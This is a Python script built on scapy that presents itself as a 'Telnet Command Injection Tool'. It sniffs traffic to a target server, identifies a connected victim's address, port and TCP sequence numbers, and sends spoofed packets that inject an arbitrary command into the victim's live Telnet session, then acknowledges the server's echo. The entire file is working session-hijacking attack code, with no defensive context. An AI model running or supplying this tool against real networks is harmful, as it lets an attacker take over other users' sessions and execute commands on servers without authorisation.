from scapy.all import sniff, send 
from scapy.layers.inet import IP, TCP 
import ast 
import argparse 

def pkt_to_dict(pkt): 
    """ 
    Convert packet to dictionary format. 
    This function takes a packet and converts its content into a dictionary format. 
    The dictionary is structured with layers as keys (e.g., IP, TCP) and their attributes as nested key-value pairs. 
    Args: 
    - pkt: The packet to be converted. 
    Returns: 
    - packet_dict: A dictionary representation of the packet. 
    """ 
    packet_dict = {} 
    current_layer = None 
    
    # Iterate over each line of the packet's string representation 
    for line in pkt.split('\n'): 
        # Check if the line indicates a new layer (e.g., "###[ IP ]###") 
        if line.startswith("###["): 
            current_layer = line.replace("###[", '').replace("]###", '').strip().lower() 
        else: 
            # Split the line into key-value pairs 
            key_val = line.split("=") 
            # Ensure the line contains a valid key-value pair 
            if len(key_val) == 2: 
                # Add the key-value pair to the current layer in the dictionary 
                packet_dict.setdefault(current_layer, {})[key_val[0].strip()] = key_val[1].strip() 

    return packet_dict 

def detect_victim(packet_info, state, server_host): 
    """ 
    Detect the victim host and port. 
    This function checks the destination IP of the packet to see if it matches the target server. 
    If it does, and the victim's host and port haven't been identified yet, it sets the victim's details in the state. 
    Args: 
    - packet_info: A dictionary representation of the packet. 
    - state: A dictionary holding the current state of the session. 
    - server_host: The IP address of the target server. 
    """ 
    
    # Check if the packet's destination IP matches the server and if the victim's details are not set yet 
    if packet_info['ip']['dst'] == server_host and not state['victim_host'] and not state['victim_port']: 
        state['victim_host'] = packet_info['ip']['src'] 
        state['victim_port'] = int(packet_info['tcp']['sport']) 
        state['initial_seq'] = int(packet_info['tcp']['seq']) 
        state['initial_ack'] = int(packet_info['tcp']['ack']) 
        print("Detected victim host:", state['victim_host']) 
        print("Detected victim port:", state['victim_port']) 

def send_command(packet_info, state, server_host, server_port, command_to_send): 
    """ 
    Send the hijack command. 
    This function checks if the conditions are right to send the hijack command. 
    If they are, it constructs a new packet with the command and sends it. 
    Args: 
    - packet_info: A dictionary representation of the packet. 
    - state: A dictionary holding the current state of the session. \
    - server_host: The IP address of the target server. 
    - server_port: The port number of the target server. 
    - command_to_send: The command to be injected into the session. 
    """ 

    # Check if the TCP flag is 'A' (Acknowledgment) and if the command hasn't been sent yet 
    if packet_info['tcp']['flags'] == 'A' and not state['command_sent']: 
        seq = int(packet_info['tcp']['seq']) 
        ack = int(packet_info['tcp']['ack']) 
        print("Preparing to send command:", command_to_send.strip()) 
        print(f"Sending command with SEQ: {seq} and ACK: {ack}") 
        
        # Construct the IP and TCP layers for the new packet 
        ip_layer = IP(src=state['victim_host'], dst=server_host) 
        tcp_layer = TCP(sport=state['victim_port'], dport=server_port, flags="PA", seq=seq, ack=ack) 

        # Combine the layers and the command to form the complete packet 
        pkt = ip_layer / tcp_layer / command_to_send 

        # Send the packet 
        send(pkt, verbose=0) 

        # Store the sequence number of the sent packet in the state dictionary 
        state['last_seq'] = seq + len(command_to_send) 
        print("***\nCommand successfully injected!\n***") 
        state['command_sent'] = True 
 
def acknowledge_echo(packet_info, state, server_host, server_port): 
    """ 
    Send an acknowledgment to the server after receiving the echo. 
    Args: 
    - packet_info: A dictionary representation of the packet. 
    - state: A dictionary holding the current state of the session. 
    - server_host: The IP address of the target server. 
    - server_port: The port number of the target server. 
    """ 
    # Calculate the new sequence and acknowledgment numbers 
    seq = int(packet_info['tcp']['ack']) 
    ack = int(packet_info['tcp']['seq']) + len(packet_info.get('raw', {}).get('load', '')) 
    
    # Construct the IP and TCP layers for the acknowledgment packet 
    ip_layer = IP(src=state['victim_host'], dst=server_host) 
    tcp_layer = TCP(sport=state['victim_port'], dport=server_port, flags="A", seq=seq, ack=ack) 

    # Combine the layers to form the complete packet 
    pkt = ip_layer / tcp_layer 

    # Send the packet 
    send(pkt, verbose=0) 
    print(f"Acknowledgement of echo sent to server with SEQ: {seq} and ACK: {ack}") 

def check_echo(packet_info, state, server_host, server_port): 
    """ 
    Check for an echo from the server after sending the hijack command. 
    After the command is injected into the Telnet session, the server might echo  
    part or all of the command back to the client. This function checks if the server  
    has echoed back any data. If an echo is detected, it prints the echoed data. 
    Args: 
    - packet_info: A dictionary representation of the packet. 
    - state: A dictionary holding the current state of the session. 
    - server_host: The IP address of the target server. 
    """ 

    # Check if the command was sent, the source IP is the server's 
    if state['command_sent'] and packet_info['ip']['src'] == server_host: 
        # Check if the acknowledgment number matches our expectation 
        if int(packet_info['tcp']['ack']) == state['last_seq']: 
            # If there's a 'raw' layer in the packet, it might contain the echoed data 
            if 'raw' in packet_info: 
                echoed_data = ast.literal_eval("b" + packet_info['raw']['load']) 
                
                # Print the echoed data and the sequence number 
                print(f"Server ECHO with SEQ: {packet_info['tcp']['seq']} and ACK: {packet_info['tcp']['ack']}:", echoed_data.decode(errors='replace')) 
                acknowledge_echo(packet_info, state, server_host, server_port) 
                print("SUCCESS!") 

                # Update the state to indicate that the echo was received 
                state['response_received'] = True 

def process_packet(pkt, server_host, server_port, command_to_send, state): 
    """ 
    Process each packet to detect the victim, send the hijack command, and check for acknowledgment. 
    This function is called for each packet that matches the sniffing filter. 
    It converts the packet to a dictionary format, detects the victim, sends the hijack command, and checks for acknowledgment. 
    Args: 
    - pkt: The packet to be processed. 
    - server_host: The IP address of the target server. 
    - server_port: The port number of the target server. 
    - command_to_send: The command to be injected into the session. 
    - state: A dictionary holding the current state of the session. 
    """ 
    packet_info = pkt_to_dict(pkt.show(dump=True)) 

    # If the packet's raw data matches the command to send, return early to avoid processing it 
    if 'raw' in packet_info and ast.literal_eval("b" + packet_info['raw']['load']) == command_to_send: 
        return 

    detect_victim(packet_info, state, server_host) 

    # Check if the last raw data from the state ends with a newline or carriage return, indicating a possible command 
    if state['last_raw_data'] and (state['last_raw_data'].endswith(b'\r\n') or state['last_raw_data'].endswith(b'\r\x00')): 
        send_command(packet_info, state, server_host, server_port, command_to_send) 

    check_echo(packet_info, state, server_host, server_port) 

    # Update the state's last raw data with the current packet's raw data 
    if 'raw' in packet_info: 
        state['last_raw_data'] = ast.literal_eval("b" + packet_info['raw']['load']) 

def main(): 
    """ 
    Main function to execute the Telnet Command Injection Tool. 
    This function initializes the argument parser, sets up the initial state, and starts packet sniffing. 
    It listens for packets that match the specified filter and processes each packet using the `process_packet` function. 
    Sniffing stops when an acknowledgment is received from the server after sending the hijack command. 
    """ 
    # Initialize the argument parser with a description of the tool 
    parser = argparse.ArgumentParser(description="Telnet Command Injection Tool") 

    # Add arguments for target IP, port, and the command to send 
    parser.add_argument("--target", "-t", required=True, help="Target IP") 
    parser.add_argument("--port", "-p", default=23, type=int, help="Telnet port (default: 23)") 
    parser.add_argument("--command", "-c", required=True, help="Command to send, example -c 'echo hello > test.txt'") 

    # Parse the provided arguments 
    args = parser.parse_args() 

    # Extract the target server's IP, port, and the command to send from the parsed arguments 
    server_host = args.target 
    server_port = args.port 
    command_to_send = (args.command + "\r\n").encode() 

    # Set up the initial state dictionary with default values 
    state = { 
        'victim_host': None, 
        'victim_port': None, 
        'last_raw_data': None, 
        'command_sent': False, 
        'ack_received': False 
    } 

    print("Starting packet sniffing...") 

    # Begin the packet sniffing process using the 'sniff' function from scapy. 
    sniff( 
        # Set the filter to capture only TCP packets that are related to the specified target server and port. 
        filter=f"tcp and host {server_host} and tcp port {server_port}",  
        # For each packet that matches the filter, call the 'process_packet' function. 
        # This function will handle the logic of detecting the victim, sending the hijack command,  
        # and checking for acknowledgments. 
        prn=lambda pkt: process_packet(pkt, server_host, server_port, command_to_send, state) or None, 
        # Stop the sniffing process once an acknowledgment is received from the server. 
        # This is determined by checking the 'ack_received' key in the 'state' dictionary. 
        stop_filter=lambda pkt: state.get('response_received', False) 
    ) 

# Check if the script is being run as the main module and execute the main function 
if __name__ == "__main__": 
    main() 